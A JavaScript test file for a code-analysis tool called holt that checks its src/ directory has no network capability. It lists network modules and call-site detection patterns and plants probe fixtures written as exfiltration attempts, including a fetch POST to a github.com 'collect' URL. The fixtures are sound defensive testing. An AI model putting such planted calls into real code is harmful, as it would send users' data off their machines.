// SPDX-License-Identifier: FSL-1.1-MIT
/**
 * holt — the analysis engine makes no network calls, proven by capability rather than by text.
 *
 * THE PROMISE THIS DEFENDS. holt claims your code never leaves your machine: no telemetry, no
 * phone-home, on any tier. That claim is worth something precisely because anyone can verify it in
 * one command without trusting our judgement about which calls are benign — so the check has to be
 * absolute, and it has to be checkable by the customer, not just by us.
 *
 * WHY THIS REPLACED A grep FOR URLs. The CI guard matched any `https?://` in src/, with an
 * allowlist of domains considered harmless. Two things were wrong with it, and the second is the
 * one that matters:
 *
 *   1. IT FIRED ON THE WRONG THING. The moment the product's own pricing URL moved from holt.dev
 *      to github.io, two help-text strings — `Get one at <url>` — failed the build. A URL inside a
 *      string is not a network call, and no amount of allowlist maintenance makes a text search
 *      understand that difference. The allowlist had already been extended once; extending it
 *      again is the band-aid that fails a third time.
 *
 *   2. AN ALLOWLIST OF DOMAINS IS THE WRONG GUARANTEE ANYWAY. It says "we only talk to approved
 *      hosts", when the promise is "we do not talk". A grep that permits `github.com` would have
 *      waved through a genuine exfiltration to a github.com URL.
 *
 * So this asserts the CAPABILITY is absent: src/ imports no network-capable module and contains no
 * network call site. A module that cannot open a socket cannot phone home, whatever strings it
 * carries. That is a stronger property than the grep it replaces, and it is not fooled by text.
 *
 * The one download holt ever performs — the portable ctags fetch — lives in bin/install-ctags.mjs,
 * outside src/, precisely so this property stays absolute. See src/toolchain.mjs.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const SRC = path.join(ROOT, 'src');

/** Modules that can open a socket. Importing one is the capability; using it is the act. */
const NETWORK_MODULES = [
  'node:http', 'node:https', 'node:net', 'node:dgram', 'node:tls', 'node:http2',
  'http', 'https', 'net', 'dgram', 'tls', 'http2',
  'undici', 'axios', 'node-fetch', 'got', 'superagent', 'request', 'ws', 'socket.io-client',
];

/** Call sites that reach the network without importing anything. */
const NETWORK_CALLS = [
  { re: /(?<![\w.])fetch\s*\(/, what: 'fetch()' },
  { re: /\bnew\s+WebSocket\s*\(/, what: 'new WebSocket()' },
  { re: /\bnavigator\s*\.\s*sendBeacon\s*\(/, what: 'navigator.sendBeacon()' },
  { re: /\bXMLHttpRequest\b/, what: 'XMLHttpRequest' },
  { re: /\bnew\s+EventSource\s*\(/, what: 'new EventSource()' },
];

const importedModules = (source) => {
  const found = new Set();
  const patterns = [
    /\bimport\s+[^'"]*?from\s*['"]([^'"]+)['"]/g,   // import x from 'm'
    /\bimport\s*\(\s*['"]([^'"]+)['"]\s*\)/g,        // await import('m')
    /\bimport\s+['"]([^'"]+)['"]/g,                  // import 'm'
    /\brequire\s*\(\s*['"]([^'"]+)['"]\s*\)/g,       // require('m')
    /\bcreateRequire\([^)]*\)\s*\(\s*['"]([^'"]+)['"]/g,
  ];
  for (const re of patterns) {
    for (const m of source.matchAll(re)) found.add(m[1]);
  }
  return found;
};

/** Strip comments and string literals, so a URL in help text is not mistaken for code. */
const codeOnly = (source) => source
  .replace(/\/\*[\s\S]*?\*\//g, ' ')
  .replace(/(^|[^:])\/\/[^\n]*/g, '$1 ')
  .replace(/`(?:\\[\s\S]|[^\\`])*`/g, '``')
  .replace(/'(?:\\.|[^\\'])*'/g, "''")
  .replace(/"(?:\\.|[^\\"])*"/g, '""');

async function sourceFiles(dir) {
  const out = [];
  for (const e of await fs.readdir(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) out.push(...await sourceFiles(p));
    else if (/\.(mjs|js|cjs)$/.test(e.name)) out.push(p);
  }
  return out;
}

/** The whole check, factored so the same code can be pointed at a planted fixture. */
async function networkFindings(dir) {
  const findings = [];
  for (const file of await sourceFiles(dir)) {
    const raw = await fs.readFile(file, 'utf8');
    const code = codeOnly(raw);
    const rel = path.relative(ROOT, file);

    for (const mod of importedModules(raw)) {
      if (NETWORK_MODULES.includes(mod)) findings.push(`${rel}: imports ${mod}`);
    }
    for (const { re, what } of NETWORK_CALLS) {
      if (re.test(code)) findings.push(`${rel}: calls ${what}`);
    }
  }
  return findings;
}

test('NO NETWORK: src/ imports no network-capable module and contains no call site', async () => {
  const findings = await networkFindings(SRC);
  assert.deepEqual(findings, [],
    'the free tool promises your code never leaves your machine, and that promise is only worth ' +
    'something if it is absolute:\n  ' + findings.join('\n  '));
});

test('NO NETWORK: the check FIRES on a real network call — proven, not assumed', async (t) => {
  // A guard nobody watched fire is a guard nobody can trust. Every one of these is a way a real
  // exfiltration could be written, INCLUDING through a domain a URL allowlist would have waved
  // through — which is why capability, not text, is the property being asserted.
  const dir = await fs.mkdtemp(path.join(process.env.HOLT_TMPDIR || os.tmpdir(), 'holt-netprobe-'));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));

  const attacks = [
    ['fetch.mjs', 'export const go = () => fetch("https://github.com/collect", { method: "POST" });\n'],
    ['https.mjs', 'import https from "node:https";\nexport const go = () => https.request("x");\n'],
    ['net.mjs', 'import { connect } from "node:net";\nexport const go = () => connect(80);\n'],
    ['dgram.mjs', 'import dgram from "node:dgram";\nexport const s = dgram.createSocket("udp4");\n'],
    ['undici.mjs', 'import { request } from "undici";\nexport const go = () => request("x");\n'],
    ['dynamic.mjs', 'export const go = async () => (await import("node:http")).get("x");\n'],
    ['required.mjs', 'const http = require("node:http");\nexport const go = () => http.get("x");\n'],
  ];

  for (const [name, source] of attacks) {
    const probe = path.join(dir, 'probe');
    await fs.rm(probe, { recursive: true, force: true });
    await fs.mkdir(probe, { recursive: true });
    await fs.writeFile(path.join(probe, name), source);
    const findings = await networkFindings(probe);
    assert.ok(findings.length > 0,
      `the check did NOT fire on ${name} — it cannot be trusted to have found nothing in src/`);
  }
});

test('NO NETWORK: a URL in help text is NOT a network call', async (t) => {
  // The false positive that broke the build and prompted this rewrite. The product's own pricing
  // URL moved from holt.dev to github.io and two help strings — `Get one at <url>` — failed CI,
  // because the old guard searched TEXT and carried a domain allowlist. Appending another domain
  // was the obvious fix and the wrong one: an allowlist says "we only talk to approved hosts",
  // when the promise is "we do not talk".
  const dir = await fs.mkdtemp(path.join(process.env.HOLT_TMPDIR || os.tmpdir(), 'holt-urltext-'));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));
  await fs.writeFile(path.join(dir, 'help.mjs'),
    'export const FIX = "Get one at https://example.invalid/pricing, then run: holt license activate";\n'
    + '// see https://example.invalid/docs for the whole story\n'
    + 'export const DOCS = `https://example.invalid/guide`;\n');

  assert.deepEqual(await networkFindings(dir), [],
    'a URL inside a string or a comment is text, not a call — flagging it makes the guard a ' +
    'maintenance burden that eventually gets weakened to shut it up');
});
